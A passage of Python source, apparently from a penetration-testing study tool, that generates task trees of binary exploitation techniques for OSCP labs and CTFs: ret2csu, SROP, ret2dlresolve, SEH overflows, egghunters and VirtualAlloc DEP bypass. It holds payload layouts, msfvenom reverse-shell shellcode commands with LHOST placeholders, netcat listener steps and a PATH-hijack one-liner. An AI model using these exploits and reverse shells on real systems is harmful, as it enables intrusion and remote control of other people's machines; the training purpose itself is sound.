                                            'Use different syscall (execveat, etc)',
                                            'Multi-stage: mprotect + shellcode'
                                        ],
                                        'notes': 'Syscall numbers: x64 execve=59, x86 execve=11. Check: cat /usr/include/asm/unistd_64.h'
                                    }
                                }
                            ]
                        },
                        {
                            'id': 'ret2csu',
                            'name': 'Ret2csu - Universal Gadget',
                            'type': 'parent',
                            'children': [
                                {
                                    'id': 'ret2csu-basics',
                                    'name': 'Understand __libc_csu_init Gadget',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Abuse __libc_csu_init for multi-register control',
                                        'tags': ['OSCP:MEDIUM', 'RET2CSU', 'ADVANCED'],
                                        'next_steps': [
                                            '__libc_csu_init contains universal gadgets in all dynamically linked ELF',
                                            'Gadget 1 (pop chain):',
                                            '  pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret',
                                            '  Allows setting 6 registers from stack',
                                            'Gadget 2 (register moves + call):',
                                            '  mov rdx, r15;  # 3rd arg',
                                            '  mov rsi, r14;  # 2nd arg',
                                            '  mov edi, r13d; # 1st arg (32-bit)',
                                            '  call [r12 + rbx*8]; # Function pointer',
                                            'Use when lacking pop rdi/rsi/rdx gadgets',
                                            'Useful for controlling 3 function arguments'
                                        ],
                                        'alternatives': [
                                            'Find pop gadgets directly if available',
                                            'Use other universal gadgets (ret2dlresolve)',
                                            'Try JOP (Jump-Oriented Programming) if ROP limited'
                                        ],
                                        'notes': 'Present in all dynamically linked binaries. Complex but powerful. Can control RDI/RSI/RDX via R13/R14/R15.'
                                    }
                                },
                                {
                                    'id': 'find-ret2csu',
                                    'name': 'Locate ret2csu Gadgets',
                                    'type': 'command',
                                    'metadata': {
                                        'command': f'objdump -d {binary_path} | grep -A 10 "<__libc_csu_init>"',
                                        'description': 'Find __libc_csu_init gadgets in binary',
                                        'tags': ['OSCP:MEDIUM', 'RET2CSU'],
                                        'flag_explanations': {
                                            '-d': 'Disassemble executable sections',
                                            'objdump': 'Display object file information',
                                            '__libc_csu_init': 'Initialization function with useful gadgets',
                                            '-A 10': 'Show 10 lines after match'
                                        },
                                        'success_indicators': [
                                            'Function found',
                                            'pop rbx; pop rbp; ... sequence visible',
                                            'mov rdx, r15 sequence visible'
                                        ],
                                        'failure_indicators': [
                                            'Function not found (statically linked)',
                                            'Different compiler optimization removed gadgets'
                                        ],
                                        'next_steps': [
                                            'Note address of pop chain (usually near end of function)',
                                            'Note address of mov+call chain (earlier in function)',
                                            'Offset typically: pop_gadget = csu_init + 0x5a (varies)',
                                            'Test offsets in gdb to confirm',
                                            'Build exploit using both gadgets'
                                        ],
                                        'alternatives': [
                                            'ROPgadget --binary binary | grep -A 5 "pop rbx"',
                                            'ropper --file binary --search "pop rbx; pop rbp"',
                                            'Manual: Search for opcodes 5b 5d 41 5c 41 5d 41 5e 41 5f c3'
                                        ],
                                        'notes': 'Gadget 1 offset ~0x5a from csu_init. Gadget 2 offset ~0x40. Verify with objdump or gdb.'
                                    }
                                },
                                {
                                    'id': 'ret2csu-example',
                                    'name': 'Build Ret2csu Chain',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Construct ret2csu exploit chain',
                                        'tags': ['OSCP:MEDIUM', 'RET2CSU'],
                                        'next_steps': [
                                            'Example: Call write(4, buf, len) to leak data',
                                            'Setup chain:',
                                            '  pop_chain_addr',
                                            '  p64(0)          # RBX (set to 0)',
                                            '  p64(1)          # RBP (must equal RBX+1 to avoid loop)',
                                            '  p64(func_ptr)   # R12 (pointer to function to call)',
                                            '  p64(4)          # R13 (RDI = fd)',
                                            '  p64(buf_addr)   # R14 (RSI = buffer)',
                                            '  p64(100)        # R15 (RDX = length)',
                                            '  mov_call_addr',
                                            '  p64(0)*7        # Filler for pops after call',
                                            'func_ptr must point to function address (e.g., GOT entry)',
                                            'Bypasses lack of pop rsi/rdx gadgets'
                                        ],
                                        'alternatives': [
                                            'Use if main exploit has pop gadgets',
                                            'Combine with ret2dlresolve for complex chains',
                                            'Use SROP if ret2csu too complex'
                                        ],
                                        'notes': 'RBP must = RBX+1 to avoid jump. R12 must point to valid function ptr (not address itself). Add 7 padding p64(0) after call for pops.'
                                    }
                                }
                            ]
                        },
                        {
                            'id': 'srop',
                            'name': 'SROP - Sigreturn-Oriented Programming',
                            'type': 'parent',
                            'children': [
                                {
                                    'id': 'srop-basics',
                                    'name': 'Understand sigreturn Syscall',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Control all registers via sigreturn syscall',
                                        'tags': ['OSCP:MEDIUM', 'SROP', 'ADVANCED'],
                                        'next_steps': [
                                            'sigreturn (syscall 15) restores CPU state after signal',
                                            'Reads sigcontext structure from stack',
                                            'Pops ALL register values from stack:',
                                            '  R8, R9, R10, R11, R12, R13, R14, R15',
                                            '  RDI, RSI, RBP, RBX, RDX, RAX, RCX',
                                            '  RSP, RIP (control stack and instruction pointer!)',
                                            '  EFLAGS, CS, SS, etc.',
                                            'Attacker can fake sigcontext on stack',
                                            'Call sigreturn → All registers controlled',
                                            'Perfect for ret2syscall when lacking gadgets',
                                            'Use case: Set RAX=59, RDI="/bin/sh", call execve'
                                        ],
                                        'alternatives': [
                                            'Use if lacking pop gadgets for ret2syscall',
                                            'Combine with partial overwrites',
                                            'Chain multiple SROPs for complex operations'
                                        ],
                                        'notes': 'x64: syscall 15 (rt_sigreturn). x86: syscall 119. ARM64: syscall 139. Need: buffer overflow, syscall instruction, writable memory.'
                                    }
                                },
                                {
                                    'id': 'srop-build-frame',
                                    'name': 'Build SROP Frame',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Construct sigreturn frame for register control',
                                        'tags': ['OSCP:MEDIUM', 'SROP'],
                                        'next_steps': [
                                            'Use pwntools SigreturnFrame():',
                                            '  from pwn import *',
                                            '  frame = SigreturnFrame()',
                                            '  frame.rax = 59           # execve syscall',
                                            '  frame.rdi = binsh_addr   # "/bin/sh"',
                                            '  frame.rsi = 0            # argv',
                                            '  frame.rdx = 0            # envp',
                                            '  frame.rip = syscall_addr # Continue execution here',
                                            '  frame.rsp = stack_addr   # Control stack pointer',
                                            'Build payload:',
                                            '  "A" * offset',
                                            '  pop_rax + p64(15)  # Set RAX=15 (sigreturn)',
                                            '  syscall_addr       # Call sigreturn',
                                            '  bytes(frame)       # Fake sigcontext',
                                            'After sigreturn: All registers set, RIP→syscall, execve executed'
                                        ],
                                        'alternatives': [
                                            'Manual frame construction (248 bytes)',
                                            'Use if binary already calls sigreturn',
                                            'Combine with stack pivot for space'
                                        ],
                                        'notes': 'Frame size: 248 bytes (x64). Need large buffer or multiple stages. Set RIP to syscall instruction to execute controlled syscall.'
                                    }
                                },
                                {
                                    'id': 'srop-use-cases',
                                    'name': 'SROP Use Cases',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'When to use SROP technique',
                                        'tags': ['OSCP:MEDIUM', 'SROP'],
                                        'next_steps': [
                                            'Use SROP when:',
                                            '1. Lacking pop gadgets for ret2syscall',
                                            '2. Need to control many registers at once',
                                            '3. Want to pivot stack (control RSP)',
                                            '4. Calling mprotect to make memory executable',
                                            '5. Setting up complex syscall arguments',
                                            'Example workflows:',
                                            '  SROP → mprotect(stack, rwx) → write shellcode → execute',
                                            '  SROP → read(0, bss, 100) → SROP again → execve',
                                            '  SROP → execve("/bin/sh") directly',
                                            'Combines well with: ret2dlresolve, stack pivot, blind ROP'
                                        ],
                                        'alternatives': [
                                            'If have pop gadgets: use ret2syscall',
                                            'If have libc: use ret2libc',
                                            'If have RWX: use shellcode'
                                        ],
                                        'notes': 'SROP is powerful but requires: syscall instruction, large buffer (248+ bytes), ability to set RAX=15. Best for minimal-gadget scenarios.'
                                    }
                                }
                            ]
                        },
                        {
                            'id': 'advanced-rop',
                            'name': 'Advanced ROP Techniques',
                            'type': 'parent',
                            'children': [
                                {
                                    'id': 'ret2dlresolve',
                                    'name': 'Ret2dlresolve',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Abuse dynamic linker to resolve arbitrary symbols',
                                        'tags': ['OSCP:LOW', 'ADVANCED', 'RET2DLRESOLVE'],
                                        'next_steps': [
                                            'Concept: Fake .rel.plt/.dynsym/.dynstr structures',
                                            'Make _dl_runtime_resolve resolve "system"',
                                            'Call resolved system with "/bin/sh"',
                                            'Steps:',
                                            '1. Create fake link_map structures in writable memory',
                                            '2. Call read() to write fake structures',
                                            '3. Call _dl_runtime_resolve with fake offset',
                                            '4. Dynamic linker resolves "system"',
                                            '5. system("/bin/sh") executed',
                                            'Pwntools automation:',
                                            '  dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])',
                                            '  rop.read(0, dlresolve.data_addr)',
                                            '  rop.ret2dlresolve(dlresolve)',
                                            'Useful when: No libc leaks, partial RELRO only'
                                        ],
                                        'alternatives': [
                                            'Simpler: Use ret2libc with leak',
                                            'Easier: Use ret2syscall',
                                            'Required: No Full RELRO protection'
                                        ],
                                        'notes': 'Complex technique. Requires: partial RELRO, writable memory, ability to call read(). Not OSCP-common but powerful for CTFs.'
                                    }
                                },
                                {
                                    'id': 'brop',
                                    'name': 'BROP - Blind ROP',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'ROP without binary access (blind exploitation)',
                                        'tags': ['OSCP:LOW', 'ADVANCED', 'BLIND_ROP'],
                                        'next_steps': [
                                            'Scenario: Remote service, no binary, restarts on crash',
                                            'Steps:',
                                            '1. Find buffer overflow offset (crash detection)',
                                            '2. Brute-force canary (if present)',
                                            '3. Find STOP gadget (non-crashing address)',
                                            '4. Find BROP gadget (ret2csu pop chain)',
                                            '5. Find PLT entries (0x10 byte alignment)',
                                            '6. Find strcmp in PLT (sets RDX)',
                                            '7. Find write/puts in PLT (leak binary)',
                                            '8. Dump binary via write()',
                                            '9. Build normal ROP with dumped binary',
                                            'Tools: Bropper (automated BROP)',
                                            'Time: Can take hours for full exploitation'
                                        ],
                                        'alternatives': [
                                            'Get binary via other means (file disclosure)',
                                            'Use partial overwrite techniques',
                                            'Information disclosure vulnerabilities'
                                        ],
                                        'notes': 'Rare in OSCP. More common in CTFs. Requires: forking server, crash tolerance. Very time-consuming.'
                                    }
                                },
                                {
                                    'id': 'ret2esp-ret2reg',
                                    'name': 'Ret2esp / Ret2reg',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Jump to stack pointer or other register',
                                        'tags': ['OSCP:MEDIUM', 'RET2ESP'],
                                        'next_steps': [
                                            'Ret2esp: Jump to ESP/RSP for shellcode execution',
                                            'Find jmp esp or call esp gadget',
                                            '  ROPgadget --binary binary | grep "jmp rsp"',
                                            '  Manual: Search for opcode ff e4 (jmp esp)',
                                            'Layout: overflow + jmp_esp_addr + NOP + shellcode',
                                            'When RIP hits jmp esp: RSP→shellcode, executed',
                                            'Ret2reg: Jump to other register with shellcode',
                                            '  Common: ret2eax (strcpy returns buffer in EAX)',
                                            '  Find: call eax or jmp eax',
                                            'Requires: No NX (executable stack), controlled register',
                                            'ARM64: Ret2x0 (X0 holds return values)'
                                        ],
                                        'alternatives': [
                                            'If NX enabled: Use ROP/ret2libc instead',
                                            'If ASLR: Partial overwrite or leak',
                                            'Modern: Stack pivot to heap'
                                        ],
                                        'notes': 'Old technique, less common with NX. Useful in embedded, CTFs, legacy systems. jmp esp = \\xff\\xe4, jmp eax = \\xff\\xe0.'
                                    }
                                },
                                {
                                    'id': 'stack-pivot',
                                    'name': 'Stack Pivoting',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Move stack pointer to controlled memory',
                                        'tags': ['OSCP:MEDIUM', 'STACK_PIVOT'],
                                        'next_steps': [
                                            'Goal: RSP → heap/data/bss with large ROP chain',
                                            'Useful when: Small stack space, large ROP needed',
                                            'Common pivots:',
                                            '  leave; ret → mov rsp, rbp; pop rbp',
                                            '  xchg rax, rsp; ret → Swap RSP and RAX',
                                            '  mov rsp, rdi; ret → RSP from RDI',
                                            '  add rsp, 0xNN; ret → Adjust stack',
                                            '  pop rsp; ret → Direct stack control',
                                            'ARM64 pivot:',
                                            '  mov sp, x0; ldp x29, x30, [sp], #0x10; ret',
                                            'Build chain:',
                                            '  1. Write large ROP to heap/bss',
                                            '  2. Small stack ROP pivots to heap',
                                            '  3. Large chain executes from heap'
                                        ],
                                        'alternatives': [
                                            'Use multiple small chains',
                                            'Leverage stack adjustment gadgets',
                                            'Return to vulnerable function multiple times'
                                        ],
                                        'notes': 'Critical for constrained stack overflows. Heap feng shui for pivot targets. Verify target address is controlled and writable.'
                                    }
                                }
                            ]
                        }
                    ]
                }
            ]
        }

    def _generate_windows_exploitation_tasks(self, binary_path: str, version: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Windows-specific exploitation tasks"""
        return {
            'id': 'phase-4-windows-exploit',
            'name': 'Phase 4: Windows Exploitation Strategy',
            'type': 'parent',
            'children': [
                {
                    'id': 'seh-overflow',
                    'name': 'SEH-based Exploitation (x86 Windows)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'verify-seh-overwrite',
                            'name': 'Verify SEH Overwrite',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Confirm buffer overflow overwrites SEH chain on stack',
                                'tags': ['OSCP:HIGH', 'WINDOWS'],
                                'next_steps': [
                                    'Crash application with large buffer',
                                    'x32dbg: Check "SEH chain" view',
                                    'Verify nSEH/SEH fields overwritten with As',
                                    'Send cyclic pattern to find nSEH/SEH offsets',
                                    'Calculate: offset_nSEH and offset_SEH (4 bytes apart)',
                                    'Test: "A"*offset_nSEH + "BBBB" + "CCCC" + padding',
                                    'Confirm nSEH=0x42424242, SEH=0x43434343'
                                ],
                                'alternatives': [
                                    'Immunity Debugger + mona.py: !mona seh',
                                    'WinDbg: !exchain (view SEH chain)',
                                    'Manual: Check stack for exception handler pointers'
                                ],
                                'notes': 'SEH = Structured Exception Handler. x86 only. nSEH = next SEH record (4 bytes), SEH = handler address (4 bytes).'
                            }
                        },
                        {
                            'id': 'find-pop-pop-ret',
                            'name': 'Find POP POP RET Gadget',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Locate SEH gadget in non-SafeSEH module',
                                'tags': ['OSCP:HIGH', 'WINDOWS'],
                                'next_steps': [
                                    'mona.py: !mona modules (list loaded modules)',
                                    'Find module with: SafeSEH=False, ASLR=False, Rebase=False',
                                    'mona.py: !mona seh -m module.dll',
                                    'Get POP POP RET address (e.g., 0x5f4a358f)',
                                    'Verify address has no bad characters',
                                    'Alternative: Use binary itself if unprotected'
                                ],
                                'alternatives': [
                                    'ERC.Xdbg (x64dbg): ERC --SEH',
                                    'rp++: rp-win.exe -f module.dll -r 3 --unique | grep "pop.*pop.*ret"',
                                    'Manual search: opcodes for POP POP RET'
                                ],
                                'notes': 'POP POP RET unwinds SEH frame. Must be in non-SafeSEH module. Windows system DLLs often suitable.'
                            }
                        },
                        {
                            'id': 'seh-jump-back',
                            'name': 'Construct Short Jump to Near Jump',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Chain jumps to reach shellcode before nSEH',
                                'tags': ['OSCP:HIGH', 'WINDOWS', 'MANUAL'],
                                'next_steps': [
                                    'nSEH space: Only 4 bytes available',
                                    'Strategy: short jump (2 bytes) + 2 byte padding',
                                    'Place 5-byte near jump just before nSEH',
                                    'nasmshell.com: "jmp short -8" → \\xeb\\xf6',
                                    'nasmshell.com: "jmp -660" → \\xe9\\x67\\xfd\\xff\\xff',
                                    'Layout: [NOP+shellcode][padding][near_jmp -X][nSEH: short_jmp -8][SEH: pop_pop_ret]',
                                    'When exception triggered: SEH→POP POP RET→nSEH→short jmp→near jmp→shellcode'
                                ],
                                'alternatives': [
                                    'Use longer nSEH space if available',
                                    'Alternative: Jump forward to shellcode after SEH'
                                ],
                                'notes': 'Short jmp: 2 bytes, range ±128. Near jmp: 5 bytes, range ±2GB. Account for jump distance calculation.'
                            }
                        },
                        {
                            'id': 'windows-shellcode',
                            'name': 'Generate Windows Shellcode',
                            'type': 'command',
                            'metadata': {
                                'command': 'msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f python -b "\\x00\\x0a\\x0d" -a x86 --platform windows',
                                'description': 'Create Windows reverse shell avoiding bad characters',
                                'tags': ['OSCP:HIGH', 'WINDOWS'],
                                'flag_explanations': {
                                    '-p': 'Payload type',
                                    'windows/shell_reverse_tcp': 'Windows reverse shell',
                                    '-a x86': 'Architecture (32-bit)',
                                    '--platform windows': 'Target platform',
                                    '-f python': 'Python format output',
                                    '-b': 'Bad characters to avoid'
                                },
                                'success_indicators': [
                                    'Shellcode generated',
                                    'No bad characters present',
                                    'Payload size acceptable (300-500 bytes typical)'
                                ],
                                'next_steps': [
                                    'Add NOPs before shellcode: "\\x90"*16',
                                    'Start listener: rlwrap nc -nlvp <LPORT>',
                                    'Assemble full exploit buffer',
                                    'Send and trigger exception',
                                    'Get reverse shell when exploitation succeeds'
                                ],
                                'alternatives': [
                                    'windows/meterpreter/reverse_tcp for Metasploit',
                                    'windows/exec CMD="calc.exe" for PoC',
                                    'Custom shellcode from shell-storm'
                                ],
                                'notes': 'EXITFUNC=thread recommended for stability. Test with calc.exe before reverse shell.'
                            }
                        }
                    ]
                },
                {
                    'id': 'standard-eip-windows',
                    'name': 'Standard EIP Overwrite (No SEH)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'find-jmp-esp-windows',
                            'name': 'Find JMP ESP in Windows DLL',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Locate JMP ESP in non-ASLR module for shellcode execution',
                                'tags': ['OSCP:HIGH', 'WINDOWS'],
                                'next_steps': [
                                    'mona.py: !mona modules',
                                    'Find module: ASLR=False, Rebase=False',
                                    'mona.py: !mona find -s "\\xff\\xe4" -m module.dll',
                                    'JMP ESP opcode: \\xff\\xe4',
                                    'Note address without bad characters',
                                    'Build: padding + p32(jmp_esp_addr) + NOP_sled + shellcode'
                                ],
                                'alternatives': [
                                    'ERC.Xdbg: ERC --ModuleInfo, ERC --FindNRP JMP ESP',
                                    'Manual: Search for \\xff\\xe4 in module memory',
                                    'Try CALL ESP (\\xff\\xd4) or PUSH ESP; RET'
                                ],
                                'notes': 'Windows 7/older: Many non-ASLR DLLs. Windows 10+: Harder, may need leak. OSCP labs often have unprotected modules.'
                            }
                        }
                    ]
                },
                {
                    'id': 'egghunter-windows',
                    'name': 'Egghunter (Limited Space)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use egghunter when shellcode space is limited (<100 bytes)',
                        'tags': ['OSCP:MEDIUM', 'WINDOWS', 'ADVANCED'],
                        'next_steps': [
                            'mona.py: !mona egg -t W00T',
                            'Generates 32-byte egghunter shellcode',
                            'Place egghunter at EIP jump point',
                            'Place "W00TW00T" + shellcode elsewhere (stack, heap)',
                            'Egghunter searches memory for egg tag',
                            'Executes shellcode after egg tag'
                        ],
                        'alternatives': [
                            'Manual egghunter assembly',
                            'SEH-based egghunter for smaller size',
                            'Two-stage exploit with socket reuse'
                        ],
                        'notes': 'Useful for small buffer overflows. Egghunter ~32 bytes vs shellcode ~300+ bytes. Use unique egg tag.'
                    }
                }
            ]
        }

    def _generate_generic_exploitation_tasks(self, binary_path: str, version: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate platform-agnostic exploitation tasks"""
        return {
            'id': 'phase-4-generic-exploit',
            'name': 'Phase 4: Platform Detection & Strategy',
            'type': 'manual',
            'metadata': {
                'description': 'Determine target platform and select appropriate exploitation method',
                'tags': ['OSCP:HIGH', 'MANUAL'],
                'next_steps': [
                    'Identify platform: file command, service behavior, error messages',
                    'Linux: Check for ELF header, POSIX syscalls, /proc/self/maps',
                    'Windows: Check for PE header, Win32 API calls, SEH structures',
                    'Select exploitation path:',
                    '  - Linux: ret2win → stack shellcode → ROP → ret2libc',
                    '  - Windows: SEH overflow → EIP+JMP ESP → Egghunter',
                    'Review binary protections (checksec)',
                    'Adjust strategy based on NX, PIE, ASLR, Canary, SafeSEH',
                    'Generate platform-specific shellcode',
                    'Build and test exploit iteratively'
                ],
                'alternatives': [
                    'Manually inspect binary headers',
                    'Run binary and observe behavior',
                    'Check for platform-specific libraries (libc.so vs kernel32.dll)'
                ],
                'notes': 'Platform detection critical for shellcode and ROP gadgets. Cross-platform exploits rare.'
            }
        }

    def _generate_advanced_techniques(self, binary_path: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate advanced exploitation techniques task tree"""
        platform = service_info.get('platform', 'linux').lower()

        tasks = {
            'id': 'phase-5-advanced',
            'name': 'Phase 5: Advanced Techniques',
            'type': 'parent',
            'children': []
        }

        # Pointer Redirecting
        tasks['children'].append({
            'id': 'pointer-redirecting',
            'name': 'Pointer Redirecting Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': 'string-pointer-redirect',
                    'name': 'String Pointer Overwriting',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Overwrite string pointer on stack to redirect function calls',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'CTF'],
                        'next_steps': [
                            'Identify function using string pointer from stack (e.g., system(ptr))',
                            'Find address of string pointer on stack via overflow',
                            'Locate alternative string in binary (strings command)',
                            'Example: Replace "safe_command" pointer with "/bin/sh" pointer',
                            'Technique: overflow → overwrite ptr → system() executes new string',
                            'If no suitable string: use environment variables (SHELL=/bin/sh)',
                            'Alternative: Create script named after first letter of hijacked string'
                        ],
                        'alternatives': [
                            'objdump -s binary | grep "bin/sh" (find useful strings)',
                            'readelf -p .rodata binary (read-only data strings)',
                            'Manual: export PATH=.:$PATH; echo "#!/bin/sh" > s; chmod +x s'
                        ],
                        'notes': 'Useful when you can\'t control EIP but can overwrite a string pointer used by system/exec functions. Example: buffer → ptr to "ls" → overflow changes ptr to "/bin/sh".'
                    }
                },
                {
                    'id': 'function-pointer-redirect',
                    'name': 'Function Pointer Overwriting',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Overwrite function pointer on stack to hijack indirect calls',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'CTF'],
                        'next_steps': [
                            'Identify indirect function call: call [ebp-X] or call *funcptr',
                            'Disassemble to find funcptr offset from buffer',
                            'Locate address of target function (e.g., system, win, shell)',
                            'Build exploit: padding + p32(target_func_addr) + args',
                            'When funcptr called → redirects to attacker function',
                            'Common targets: system(), win(), backdoor functions',
                            'Debug to verify funcptr is controlled and called'
                        ],
                        'alternatives': [
                            'gdb: x/10i *funcptr (inspect current function)',
                            'objdump -d binary | grep "call.*QWORD PTR"',
                            'Ghidra/IDA: Check for function pointer dereferences'
                        ],
                        'notes': 'Common in C++ (vtables), callbacks, and function pointer arrays. Stack layout: [buffer][saved funcptr][args]. Requires knowing target function address (no PIE or leak).'
                    }
                }
            ]
        })

        # Uninitialized Variables
        tasks['children'].append({
            'id': 'uninitialized-vars',
            'name': 'Uninitialized Variable Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'uninit-concept',
                    'name': 'Understand Uninitialized Variables',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Learn how uninitialized stack variables retain previous values',
                        'tags': ['OSCP:MEDIUM', 'EDUCATIONAL'],
                        'next_steps': [
                            'Uninitialized variables hold whatever was last in memory',
                            'Function 1 sets local var X = 0x1234',
                            'Function 2 declares Y (uninitialized) in same stack location',
                            'Y "inherits" X\'s value from previous stack frame',
                            'Security risks:',
                            '  - Data leakage (passwords, keys in leftover memory)',
                            '  - Information disclosure (memory layout, addresses)',
                            '  - Arbitrary code execution (if pointer reused)',
                            'Example: Login function leaves password in stack → next function reads it',
                            'Exploit: Call function that leaks, then call target with unitialized var'
                        ],
                        'alternatives': [
                            'valgrind --track-origins=yes binary (detect uninitialized reads)',
                            'AddressSanitizer: compile with -fsanitize=memory',
                            'Manual: Reverse engineer stack reuse patterns'
                        ],
                        'notes': 'Common in real-world CVEs (SonicWall CVE-2025-40596, NVIDIA CVE-2025-23310). C/C++ don\'t zero-initialize stack vars. ARM64 same behavior.'
                    }
                },
                {
                    'id': 'uninit-exploitation',
                    'name': 'Exploit Uninitialized Variable',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Craft multi-stage exploit leveraging stack memory reuse',
                        'tags': ['OSCP:MEDIUM', 'CTF'],
                        'next_steps': [
                            'Stage 1: Call function that places controlled data on stack',
                            '  Example: fill buffer with addresses/values, then return',
                            'Stage 2: Call vulnerable function with uninitialized variable',
                            '  Variable reads leftover data from Stage 1',
                            'Exploit patterns:',
                            '  - Leak: Stage 1 = authentication, Stage 2 = leak password',
                            '  - Control: Stage 1 = write function ptr, Stage 2 = use ptr',
                            '  - Bypass: Stage 1 = set admin=1, Stage 2 = check admin flag',
                            'Debug: Set breakpoint in Stage 2, inspect stack for Stage 1 residue',
                            'ARM64: Identical technique (stack vars managed same way)'
                        ],
                        'alternatives': [
                            'gdb: x/100x $esp (dump stack after Stage 1)',
                            'Search for stack cookie/canary reuse',
                            'Exploit heap instead if stack unreliable'
                        ],
                        'notes': 'Requires sequential function calls and predictable stack reuse. Test with gdb to verify stack layout consistency. Real example: https://8ksec.io/arm64-part-6-uninitialized-stack-variable'
                    }
                }
            ]
        })

        # Windows-specific advanced techniques
        if platform == 'windows':
            tasks['children'].append(self._generate_windows_advanced_tasks(binary_path, service_info))

        return tasks

    def _generate_windows_advanced_tasks(self, binary_path: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Windows-specific advanced exploitation tasks"""
        return {
            'id': 'windows-advanced',
            'name': 'Windows Advanced Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'virtualalloc-rop',
                    'name': 'VirtualAlloc ROP (DEP Bypass)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'virtualalloc-basics',
                            'name': 'Understand VirtualAlloc Technique',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Bypass DEP/NX by making stack executable via VirtualAlloc ROP',
                                'tags': ['OSCP:MEDIUM', 'WINDOWS', 'ROP', 'X64'],
                                'next_steps': [
                                    'Modern Windows: Stack is non-executable (DEP/NX)',
                                    'Solution: ROP chain calls VirtualAlloc to make stack RWX',
                                    'VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)',
                                    'Win64 calling convention:',
                                    '  RCX = lpAddress (pointer to stack region, e.g., RSP)',
                                    '  RDX = dwSize (0x1000 = 4KB, large enough for chain+shellcode)',
                                    '  R8  = flAllocationType (0x1000 = MEM_COMMIT)',
                                    '  R9  = flProtect (0x40 = PAGE_EXECUTE_READWRITE)',
                                    'After VirtualAlloc returns: stack is RWX, execute shellcode',
                                    'Challenge: Find gadgets to populate RCX/RDX/R8/R9',
                                    'Alternative: VirtualProtect (changes existing memory perms)'
                                ],
                                'alternatives': [
                                    'Linux equivalent: mprotect(stack, size, PROT_READ|PROT_WRITE|PROT_EXEC)',
                                    'Use WriteProcessMemory + CreateRemoteThread (if multi-stage)',
                                    'Heap spray with executable pages'
                                ],
                                'notes': 'Requires ASLR leak to find VirtualAlloc address in IAT. Win64 only (x86 uses different calling convention). More complex than Linux ROP.'
                            }
                        },
                        {
                            'id': 'virtualalloc-rop-chain',
                            'name': 'Build VirtualAlloc ROP Chain',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Construct ROP chain to call VirtualAlloc and execute shellcode',
                                'tags': ['OSCP:MEDIUM', 'WINDOWS', 'ROP'],
                                'next_steps': [
                                    'Step 1: Leak module base address (format string, pointer leak)',
                                    'Step 2: Calculate VirtualAlloc IAT address (base + offset)',
                                    'Step 3: Find ROP gadgets in non-ASLR module:',
                                    '  pop r9; ret → Set R9 = 0x40 (PAGE_EXECUTE_READWRITE)',
                                    '  pop r8; ret → Set R8 = 0x1000 (MEM_COMMIT)',
                                    '  pop rdx; ret → Set RDX = 0x1000 (dwSize)',
                                    '  lea rcx, [rsp+X]; ret → Set RCX to stack address',
                                    '  Alternative: mov rcx, rsp; ret or pop rcx; ret',
                                    'Step 4: Build chain:',
                                    '  padding + pop_r9 + 0x40 + pop_r8 + 0x1000',
                                    '  + pop_rdx + 0x1000 + lea_rcx_rsp',
                                    '  + virtualalloc_addr + shellcode',
                                    'Step 5: VirtualAlloc returns, execution continues to shellcode',
                                    'Tip: Account for gadgets that adjust RSP (add rsp, 8; ret)'
                                ],
                                'alternatives': [
                                    'ROPgadget --binary binary.exe | grep "pop r"',
                                    'ropper --file binary.exe --search "pop r9"',
                                    'Use ret2csu if lacking direct pop r8/r9'
                                ],
                                'notes': 'If no direct pop r8/r9: use arithmetic gadgets (xor r8, r8; add r8, imm; ret). Always test in debugger before exploitation. Example: HTB Reaper (format-string leak + VirtualAlloc ROP).'
                            }
                        },
                        {
                            'id': 'virtualalloc-shellcode',
                            'name': 'Generate Windows x64 Shellcode',
                            'type': 'command',
                            'metadata': {
                                'command': 'msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f python -b "\\x00\\x0a\\x0d"',
                                'description': 'Create Windows 64-bit reverse shell for VirtualAlloc technique',
                                'tags': ['OSCP:MEDIUM', 'WINDOWS'],
                                'flag_explanations': {
                                    '-a x64': 'Architecture (64-bit)',
                                    '--platform windows': 'Target platform',
                                    'windows/x64/shell_reverse_tcp': 'Reverse shell payload (x64)',
                                    '-f python': 'Python byte array format',
                                    '-b': 'Bad characters to avoid (NULL, LF, CR)'
                                },
                                'success_indicators': [
                                    'Shellcode generated without errors',
                                    'No bad characters in output',
                                    'Size fits in allocated space (< 1KB typical)'
                                ],
                                'next_steps': [
                                    'Start listener: rlwrap nc -nlvp <LPORT>',
                                    'Append shellcode after ROP chain',
                                    'Send exploit and trigger overflow',
                                    'VirtualAlloc makes stack RWX → shellcode executes → shell'
                                ],
                                'alternatives': [
                                    'windows/x64/meterpreter/reverse_tcp (Metasploit session)',
